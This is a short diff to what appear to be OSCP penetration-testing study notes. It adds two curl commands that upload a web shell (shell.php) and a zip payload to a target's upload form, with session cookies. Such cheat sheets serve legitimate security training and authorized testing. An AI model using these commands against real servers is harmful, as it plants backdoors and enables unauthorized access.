@@ -233,3 +233,11 @@ echo $filename".json has been dumped into the current directory"
 
 ### [OSCP Cheatsheet]
 https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets
+
+
+https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#uploading-posting-files-through-www-upload-forms
+# POST file
+curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"
+
+# POST binary data to web form
+curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
